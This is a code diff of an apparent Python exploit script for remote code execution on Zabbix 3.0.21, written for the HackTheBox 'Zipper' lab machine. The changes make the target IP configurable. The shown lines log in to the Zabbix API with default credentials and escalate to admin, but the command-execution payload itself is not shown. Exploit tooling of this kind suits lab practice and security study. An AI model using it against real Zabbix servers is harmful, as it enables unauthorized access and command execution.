@@ -2,16 +2,15 @@ import requests
 import json
 import argparse
 
-
 parser = argparse.ArgumentParser(description='Rce to Zabbix 3.0.21 from user (Zipper hackthebox)')
-parser.add_argument("--hostname", default='http://10.10.10.108/zabbix', type=str, help="hostname of the box Zipper")
+parser.add_argument("--targetIp", default='10.10.10.108', type=str, help="hostname of the box Zipper")
 parser.add_argument("--username", default="zapper", type=str, help="Zabbix username")
 parser.add_argument("--password", default="zapper", type=str, help="Zabbix password")
 parser.add_argument("--hostId", default='10106', type=str, help="Your zabbix host id")
 
 args = parser.parse_args()
 
-zabbix_url = 'http://10.10.10.108/zabbix'
+zabbix_url = 'http://' + args.targetIp + '/zabbix'
 zabbix_api_target = zabbix_url + '/api_jsonrpc.php'
 
 login = args.username
@@ -62,6 +61,7 @@ auth_payload = {
 
 cmd_exe = requests.post(zabbix_api_target, data=json.dumps(auth_payload), headers=(headers))
 cmd_exe = cmd_exe.json()
+
 if "error" in cmd_exe:
     print(cmd_exe)
     exit()
@@ -84,7 +84,9 @@ admin_payload = {
 
 auth = requests.post(zabbix_api_target, data=json.dumps(admin_payload), headers=(headers))
 auth = auth.json()
+
 if "error" in auth:
     print("Wrong admin password provided")
     exit()
+
 print("Authenticated as admin")
